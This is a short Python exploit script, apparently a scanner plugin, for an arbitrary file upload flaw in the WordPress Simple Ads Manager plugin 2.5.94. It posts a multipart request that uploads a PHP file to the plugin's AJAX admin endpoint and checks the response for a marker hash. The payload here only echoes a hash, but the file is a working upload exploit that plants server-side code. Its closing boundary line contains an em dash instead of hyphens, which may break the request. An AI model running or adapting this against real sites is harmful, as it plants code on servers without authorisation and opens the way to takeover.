#!/usr/bin/env python
#-*-coding:utf-8 -*-


#__author__='网底锟'
# Name:  Wordpress plugin Simple Ads Manager - Arbitrary File Upload
# Affected version:Simple Ads Manager 2.5.94
# Refer: http://cn.1337day.com/exploit/23465


def assign(service, arg):
    if service == "wordpress":
        return True, arg


def audit(arg):
    path = '/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php'

    payload = "-----------------------------108989518220095255551617421026\r\n"
    payload += 'Content-Disposition: form-data; name="uploadfile"; filename="info.php"\r\n'
    payload += 'Content-Type: application/x-php\r\n\r\n'
    payload += '<?php echo md5(1); ?>\r\n'
    payload += '-----------------------------108989518220095255551617421026\r\n'
    payload += 'Content-Disposition: form-data; name="action"\r\n\r\n'
    payload += 'upload_ad_image\r\n'
    payload += '-----------------------------108989518220095255551617421026—\r\n'
    payload_len = len(payload)

    head = "Content-Type: multipart/form-data; boundary=---------------------------108989518220095255551617421026\r\n"
    head += "Connection: Close\r\n"
    head += "Content-Length: %d" % payload_len + '\r\n\r\n'

    url = arg + path
    #url = 'http://www.baidu.com'
    code, head, res, errcode, _ = curl.curl('-H \'%s\' -d \'%s\' %s' % (head, payload, url))

    if code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
        security_info('vulnerable File update: %s' % (url))

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com')[1])